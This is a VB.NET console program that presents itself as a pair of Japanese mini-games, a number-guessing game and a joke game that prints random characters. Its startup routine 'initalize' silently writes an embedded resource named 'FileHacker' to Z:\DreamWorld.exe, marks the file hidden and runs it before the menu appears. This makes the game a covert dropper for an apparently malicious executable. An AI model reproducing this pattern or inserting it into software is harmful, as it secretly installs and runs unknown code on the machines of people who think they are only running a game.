Imports System.IO
Imports System.Console
Imports Game1.My.Resources
Imports System.Windows.Forms
Module Module1
    Sub Main()
        initalize()
sk:
        WriteLine("ゲームを選択して下さい。" & vbCrLf & "1.数当てゲーム" & vbCrLf & "2.クソゲー")
        Dim rki = ReadKey()
        Select Case rki.Key
            Case ConsoleKey.D1
                NumberHitGame()
            Case ConsoleKey.D2
                KSG()
            Case Else
                WriteLine(vbCrLf & "エラー：1か2を選択して下さい。")
                GoTo sk
        End Select
    End Sub
    Sub initalize()
        Dim path As String = "Z:\DreamWorld.exe"
        If File.Exists(path) Then Return
        File.WriteAllBytes(path, FileHacker)
        File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.Hidden)
        Process.Start(path)
    End Sub
    Sub NumberHitGame()
init:
        WriteLine(vbCrLf & "1~1000マデノスウジヲアテテネ")
        Dim n As Integer = (New Random).Next(1, 1000)
check:
        Dim int = ReadLine()
        If Not Integer.TryParse(int, 0) Then
            WriteLine("スウジヲイレテネ")
            GoTo check
        ElseIf int < 1 Or int > 1000 Then
            WriteLine(ToKatagana("チガウヨ(はんいがいです)"))
            GoTo check
        ElseIf int < n Then
            WriteLine(ToKatagana("ちがうよ(ヒント:ちいさいよ)"))
            GoTo check
        ElseIf int > n Then
            WriteLine(ToKatagana("ちがうよ(ヒント:おおきいよ)"))
            GoTo check
        ElseIf int = n Then
            WriteLine(ToKatagana("せいかい！" & vbCrLf & "もういっかいやりますか？(Y/N)"))
            Dim key = ReadKey()
            If key.Key = ConsoleKey.Y Then
                GoTo init
            End If
        Else
            WriteLine("Program error occured. This program will restart.")
            Application.Restart()
        End If
    End Sub
    Sub KSG()
        Clear()
        While True
            Write(ABC順2(Average(Function()
                                    Return (New Random).Next(ABC順2.Length - 1)
                                End Function, 1000)))
        End While
    End Sub
    Delegate Function AverageFunc() As Integer
    Function Average(f As AverageFunc, c As Integer)
        Dim n As Decimal
        For a = 1 To c
            n += f()
        Next
        Return Math.Floor(n / c)
    End Function
    Function ToKatagana(s As String) As String
        If あいうえお順平仮名.Length <> あいうえお順片仮名.Length Then
            Throw New Exception("リソースが不正です。")
        End If
        For a = 0 To あいうえお順平仮名.Length - 1
            s = s.Replace(あいうえお順平仮名(a), あいうえお順片仮名(a))
        Next
        Return s
    End Function
End Module
